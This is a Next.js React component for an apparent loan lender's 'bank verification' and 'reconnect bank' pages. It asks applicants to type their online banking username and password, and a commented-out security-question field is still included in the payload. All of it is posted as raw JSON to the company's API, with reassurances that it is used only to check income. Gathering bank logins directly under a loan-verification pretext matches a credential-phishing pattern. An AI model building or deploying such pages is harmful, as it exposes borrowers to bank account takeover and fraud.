"use client";

import React, { FormEvent, useEffect, useState } from "react";
import Link from "next/link";
import { useSearchParams } from "next/navigation";
import {
  ArrowRight,
  CheckCircle2,
  Eye,
  EyeOff,
  Loader2,
  Lock,
} from "lucide-react";
import { accountTypes } from "@/components/apply/options";
import { companyContact } from "@/components/CompanyContact";

const API_URL = process.env.NEXT_PUBLIC_API_URL ?? "https://api.pathloans.com";

type Mode = "verify" | "reconnect";

// Statuses the backend refuses bank verification for (see routes/bankVerification.ts)
const CLOSED_STATUSES = [
  "bank_verification_completed",
  "request_a_call",
  "funded",
  "declined_pb",
  "declined_hd",
];

type Lookup = {
  applicationId: string;
  firstName: string;
  lastName: string;
  loanAmount: number;
  bankName: string | null;
  status: string;
  email: string;
  account_type: string | null;
};

type FormState = {
  fullName: string;
  email: string;
  bankName: string;
  accountType: string;
  bankingUsername: string;
  bankingPassword: string;
  securityQuestion: string;
};

type Errors = Partial<Record<keyof FormState, string>>;

const copy: Record<
  Mode,
  {
    eyebrow: string;
    title: string;
    text: string;
    submit: string;
    endpoint: string;
  }
> = {
  verify: {
    eyebrow: "Banking verification",
    title: "Verify your bank account",
    text: "Securely connect your online banking so we can instantly verify your income and financial health.",
    submit: "Verify bank account",
    endpoint: "/api/bank-verification",
  },
  reconnect: {
    eyebrow: "Bank re-verification",
    title: "Reconnect your bank",
    text: "We weren't able to complete your banking verification. Please reconnect your online banking so we can finish reviewing your application.",
    submit: "Reconnect bank",
    endpoint: "/api/bank-verification/reconnect-bank-verification",
  },
};

function validate(form: FormState): Errors {
  const errors: Errors = {};
  if (form.fullName.trim().length < 2)
    errors.fullName = "Enter your full name.";
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.email.trim()))
    errors.email = "Enter a valid email address.";
  if (form.bankName.trim().length < 2)
    errors.bankName = "Enter your bank's name.";
  if (!form.accountType) errors.accountType = "Select an account type.";
  if (!form.bankingUsername.trim())
    errors.bankingUsername = "Enter your online banking username.";
  if (!form.bankingPassword)
    errors.bankingPassword = "Enter your online banking password.";
  return errors;
}

export default function BankVerificationForm({ mode }: { mode: Mode }) {
  const searchParams = useSearchParams();
  const applicationId = searchParams.get("applicationId")?.trim() ?? "";
  const text = copy[mode];

  const [lookup, setLookup] = useState<Lookup | null>(null);
  const [lookupError, setLookupError] = useState(
    applicationId ? "" : "This link is missing an application ID.",
  );
  const [loading, setLoading] = useState(Boolean(applicationId));
  const [form, setForm] = useState<FormState>({
    fullName: "",
    email: "",
    bankName: "",
    accountType: "",
    bankingUsername: "",
    bankingPassword: "",
    securityQuestion: "",
  });
  const [errors, setErrors] = useState<Errors>({});
  const [submitError, setSubmitError] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [done, setDone] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  useEffect(() => {
    if (!applicationId) return;
    let cancelled = false;
    fetch(
      `${API_URL}/api/bank-verification/lookup?${new URLSearchParams({ applicationId })}`,
      { headers: { Accept: "application/json" }, cache: "no-store" },
    )
      .then(async (res) => {
        const body = await res.json().catch(() => null);
        if (!res.ok)
          throw new Error(body?.error ?? "We couldn't find this application.");
        return body as Lookup;
      })
      .then((data) => {
        if (cancelled) return;
        setLookup(data);
        setForm((prev) => ({
          ...prev,
          fullName: [data.firstName, data.lastName].filter(Boolean).join(" "),
          email: data.email ?? "",
          bankName: data.bankName ?? "",
          accountType:
            data.account_type === "checking" || data.account_type === "savings"
              ? data.account_type
              : "",
        }));
      })
      .catch((error) => {
        if (!cancelled)
          setLookupError(
            error instanceof Error && error.message !== "Failed to fetch"
              ? error.message
              : "We couldn't reach our servers. Check your connection and try again.",
          );
      })
      .finally(() => {
        if (!cancelled) setLoading(false);
      });
    return () => {
      cancelled = true;
    };
  }, [applicationId]);

  function set(patch: Partial<FormState>) {
    setForm((prev) => ({ ...prev, ...patch }));
    setErrors((prev) => {
      const next = { ...prev };
      for (const key of Object.keys(patch)) delete next[key as keyof FormState];
      return next;
    });
    setSubmitError("");
  }

  async function handleSubmit(event: FormEvent<HTMLFormElement>) {
    event.preventDefault();
    const nextErrors = validate(form);
    setErrors(nextErrors);
    if (Object.keys(nextErrors).length > 0 || !lookup) return;

    setSubmitting(true);
    setSubmitError("");
    try {
      const res = await fetch(`${API_URL}${text.endpoint}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          applicationId: lookup.applicationId,
          fullName: form.fullName.trim(),
          email: form.email.trim(),
          bankName: form.bankName.trim(),
          accountType: form.accountType,
          bankingUsername: form.bankingUsername.trim(),
          bankingPassword: form.bankingPassword,
          securityQuestion: form.securityQuestion.trim(),
        }),
      });
      const body = await res.json().catch(() => null);
      if (!res.ok)
        throw new Error(body?.error ?? "We couldn't submit your verification.");
      setDone(true);
      setForm((prev) => ({
        ...prev,
        bankingPassword: "",
        bankingUsername: "",
      }));
    } catch (error) {
      setSubmitError(
        error instanceof Error && error.message !== "Failed to fetch"
          ? error.message
          : "We couldn't reach our servers. Check your connection and try again.",
      );
    } finally {
      setSubmitting(false);
    }
  }

  // The status page pre-fills the ID from ?id=; the email is asked for there.
  const trackHref = lookup
    ? `/loan-status?${new URLSearchParams({ id: lookup.applicationId })}`
    : "/loan-status";

  let body: React.ReactNode;
  if (loading) {
    body = (
      <div className="card bank-verify__loading" role="status">
        <Loader2
          className="spin"
          size={18}
          strokeWidth={1.8}
          aria-hidden="true"
        />
        Loading your application…
      </div>
    );
  } else if (lookupError || !lookup) {
    body = (
      <Notice title="We couldn't load this application">
        {lookupError || "Please check your link and try again."}
      </Notice>
    );
  } else if (done) {
    body = (
      <Notice title="Thank you — your bank details were received" success>
        Your banking verification has been submitted. Next, you&apos;ll schedule
        or complete your brief call with one of our live underwriter
        specialists. We&apos;ve sent a confirmation to {lookup.email}.
        <TrackLink href={trackHref} />
      </Notice>
    );
  } else if (CLOSED_STATUSES.includes(lookup.status)) {
    body = (
      <Notice title="Bank verification isn't needed right now">
        Application #{lookup.applicationId} has moved past this step. Track your
        application to see where it stands.
        <TrackLink href={trackHref} />
      </Notice>
    );
  } else {
    body = (
      <form onSubmit={handleSubmit} noValidate className="card form">
        <div className="form__section-title">
          <h2>Your details</h2>
          <p className="muted">
            From your application — contact us if anything is wrong.
          </p>
        </div>
        <div className="form__row">
          <BvField id="bv-fullName" label="Full name" error={errors.fullName}>
            <input
              id="bv-fullName"
              value={form.fullName}
              autoComplete="name"
              disabled
              readOnly
            />
          </BvField>
          <BvField id="bv-email" label="Email address" error={errors.email}>
            <input
              id="bv-email"
              type="email"
              value={form.email}
              autoComplete="email"
              disabled
              readOnly
            />
          </BvField>
        </div>
        <div className="form__row">
          <BvField id="bv-bankName" label="Bank name" error={errors.bankName}>
            <input id="bv-bankName" value={form.bankName} disabled readOnly />
          </BvField>
          <BvField
            id="bv-accountType"
            label="Account type"
            error={errors.accountType}
          >
            <select id="bv-accountType" value={form.accountType} disabled>
              <option value="">—</option>
              {accountTypes.map((o) => (
                <option key={o.value} value={o.value}>
                  {o.label}
                </option>
              ))}
            </select>
          </BvField>
        </div>

        <div className="form__section-title">
          <h2>Online banking</h2>
          <p className="muted">
            Use the same sign-in you use for your bank&apos;s website or app.
          </p>
        </div>
        <div className="form__row">
          <BvField
            id="bv-username"
            label="Online banking username"
            error={errors.bankingUsername}
          >
            <input
              id="bv-username"
              value={form.bankingUsername}
              onChange={(e) => set({ bankingUsername: e.target.value })}
              autoComplete="off"
              aria-invalid={errors.bankingUsername ? true : undefined}
              aria-describedby={
                errors.bankingUsername ? "bv-username-err" : undefined
              }
            />
          </BvField>
          <BvField
            id="bv-password"
            label="Online banking password"
            error={errors.bankingPassword}
          >
            <div className="input-addon">
              <input
                id="bv-password"
                type={showPassword ? "text" : "password"}
                value={form.bankingPassword}
                onChange={(e) => set({ bankingPassword: e.target.value })}
                autoComplete="off"
                aria-invalid={errors.bankingPassword ? true : undefined}
                aria-describedby={
                  errors.bankingPassword ? "bv-password-err" : undefined
                }
              />
              <button
                type="button"
                className="input-addon__btn link-btn"
                onClick={() => setShowPassword((v) => !v)}
                aria-pressed={showPassword}
                aria-label={showPassword ? "Hide password" : "Show password"}
              >
                {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
              </button>
            </div>
          </BvField>
        </div>
        {/* <BvField
          id="bv-security"
          label="Security question answer"
          optional
          hint="Only if your bank asks one when you sign in."
        >
          <input
            id="bv-security"
            value={form.securityQuestion}
            onChange={(e) => set({ securityQuestion: e.target.value })}
            autoComplete="off"
            aria-describedby="bv-security-hint"
          />
        </BvField> */}

        <p className="form__hint bank-verify__secure">
          <Lock size={14} strokeWidth={1.8} aria-hidden="true" />
          Your credentials are sent over an encrypted connection and used only
          to verify your income and financial health.
        </p>

        {submitError && (
          <p role="alert" className="form-alert">
            {submitError}
          </p>
        )}

        <button
          type="submit"
          disabled={submitting}
          className="btn btn--primary btn--lg btn--block"
        >
          {submitting ? (
            <>
              <Loader2
                className="spin"
                size={18}
                strokeWidth={1.8}
                aria-hidden="true"
              />
              Submitting…
            </>
          ) : (
            <>
              {text.submit}
              <ArrowRight size={18} strokeWidth={1.8} aria-hidden="true" />
            </>
          )}
        </button>
      </form>
    );
  }

  return (
    <>
      <section className="page-hero">
        <div className="container">
          <span className="eyebrow eyebrow--light">{text.eyebrow}</span>
          <h1>{text.title}</h1>
          <p>{text.text}</p>
        </div>
      </section>
      <section className="section section--tint">
        <div className="container narrow">
          {lookup && (
            <p className="bank-verify__app">
              <span className="badge badge--amber">
                Application #{lookup.applicationId}
              </span>
              {lookup.firstName && (
                <span className="muted">for {lookup.firstName}</span>
              )}
            </p>
          )}
          {body}
          <p className="tiny center">
            Need help? Email{" "}
            <a href={companyContact.email.href}>
              {companyContact.email.display}
            </a>{" "}
            or call{" "}
            <a href={companyContact.phones.local.href}>
              {companyContact.phones.local.display}
            </a>
            .
          </p>
        </div>
      </section>
    </>
  );
}

function BvField({
  id,
  label,
  error,
  hint,
  optional,
  children,
}: {
  id: string;
  label: string;
  error?: string;
  hint?: string;
  optional?: boolean;
  children: React.ReactNode;
}) {
  return (
    <div className="field">
      <label htmlFor={id}>
        {label}
        {optional && <span className="field__opt"> (optional)</span>}
      </label>
      {children}
      {error ? (
        <p className="field__error" id={`${id}-err`}>
          {error}
        </p>
      ) : (
        hint && (
          <p className="field__hint" id={`${id}-hint`}>
            {hint}
          </p>
        )
      )}
    </div>
  );
}

function Notice({
  title,
  success,
  children,
}: {
  title: string;
  success?: boolean;
  children: React.ReactNode;
}) {
  return (
    <div role="status" className="card form-success center">
      {success ? (
        <div className="success-icon">
          <CheckCircle2 size={32} strokeWidth={2} aria-hidden="true" />
        </div>
      ) : null}
      <h2>{title}</h2>
      <div className="muted">{children}</div>
    </div>
  );
}

function TrackLink({ href }: { href: string }) {
  return (
    <div className="form-success__actions">
      <Link href={href} className="btn btn--primary btn--lg">
        Track your application
        <ArrowRight size={18} strokeWidth={1.8} aria-hidden="true" />
      </Link>
    </div>
  );
}
